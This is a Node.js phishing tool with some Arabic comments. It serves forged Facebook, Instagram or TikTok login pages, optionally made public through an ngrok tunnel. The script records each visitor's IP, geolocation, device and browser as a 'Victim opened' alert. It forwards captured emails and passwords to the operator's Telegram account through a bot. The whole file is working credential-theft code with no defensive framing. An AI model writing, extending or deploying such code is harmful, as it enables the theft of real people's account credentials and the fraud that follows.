#!/usr/bin/env node
const express = require('express');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const ua = require('ua-parser-js');
const readline = require('readline');
const ngrok = require('ngrok');
const fs = require('fs');
const os = require('os');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = q => new Promise(res => rl.question(q, ans => res(ans)));

async function main() {
  // قراءة المتغيرات المخزنة
  let env = {};
  if (fs.existsSync('.env')) {
    const envContent = fs.readFileSync('.env', 'utf8');
    envContent.split('\n').forEach(line => {
      const [key, value] = line.split('=');
      if (key && value) env[key.trim()] = value.trim();
    });
  }

  const TOKEN = env.TOKEN || await ask('BOT_TOKEN: ');
  const MASTER = env.MASTER || await ask('MASTER_ID: ');

  console.log('\n1- Facebook\n2- Instagram\n3- TikTok');
  const c = await ask('Select page (1-3): ');
  const p = ['fb', 'ig', 'tt'][parseInt(c) - 1] || 'fb';

  console.log('\n🌍 Choose link type:\n1- Local network (192.168.x.x)\n2- External internet (ngrok)');
  const linkType = await ask('Select (1-2): ');
  rl.close();

  // إعداد Express
  const app = express();
  app.use(express.json({ limit: '1mb' }));
  app.use(express.urlencoded({ extended: true }));

  // ربط الصفحات المزورة
  const PAGES = {
    fb: './pages/fb.html',
    ig: './pages/ig.html',
    tt: './pages/tt.html'
  };

  app.get(`/${p}`, (req, res) => res.sendFile(PAGES[p], { root: __dirname }));

  // استقبال البيانات
  app.post(`/${p}`, async (req, res) => {
    const { id, email, pass, ua: s, ip } = req.body;
    if (id !== MASTER) return res.sendStatus(403);

    const bot = new Telegraf(TOKEN);
    const dev = ua(s || req.headers['user-agent']);
    const geo = await axios.get(`http://ip-api.com/json/${ip || req.ip}`).catch(() => ({ data: {} }));

    if (!email && !pass) {
      const msg = `🔥 Victim opened\nPlatform: ${p}\nIP: ${ip || req.ip}\nCountry: ${geo.data.country || '?'}\nDevice: ${dev.os.name || '?'} ${dev.device.model || ''}\nBrowser: ${dev.browser.name || '?'}`;
      bot.telegram.sendMessage(MASTER, msg).catch(() => {});
    } else {
      const msg = `✅ Login detected\nPlatform: ${p}\nEmail: ${email}\nPass: ${pass}\nIP: ${ip || req.ip}`;
      bot.telegram.sendMessage(MASTER, msg).catch(() => {});
    }
    res.sendStatus(200);
  });

  const bot = new Telegraf(TOKEN);
  bot.telegram.sendMessage(MASTER, `✅ Connected!`).catch(() => {});

  let publicUrl, localUrl;
  
  if (linkType === '1') {
    // رابط محلي
    const localIp = os.networkInterfaces().wlan0?.[0]?.address || os.networkInterfaces().eth0?.[0]?.address || 'localhost';
    publicUrl = `http://${localIp}:8080/${p}?id=${MASTER}`;
    localUrl = `http://localhost:8080/${p}?id=${MASTER}`;
  } else {
    // رابط خارجي مع ngrok
    let authtoken = env.NGROK_AUTHTOKEN;
    if (!authtoken) {
      authtoken = await ask('NGROK_AUTHTOKEN (from dashboard.ngrok.com): ');
      env.NGROK_AUTHTOKEN = authtoken;
    }

    console.log('\n🌀 Starting ngrok...');
    const ngrokUrl = await ngrok.connect({
      addr: 8080,
      authtoken: authtoken,
      region: 'ap'
    });
    
    publicUrl = `${ngrokUrl}/${p}?id=${MASTER}`;
    localUrl = `http://localhost:8080/${p}?id=${MASTER}`;
  }

  // حفظ كل المتغيرات
  fs.writeFileSync('.env', `TOKEN=${TOKEN}\nMASTER=${MASTER}\nNGROK_AUTHTOKEN=${env.NGROK_AUTHTOKEN || ''}`);

  console.log(`\n🏠 Local URL:  ${localUrl}`);
  console.log(`🌍 Public URL: ${publicUrl}\n`);

  bot.launch();
  app.listen(8080, '0.0.0.0', () => console.log('Server running...\n'));
}
main();
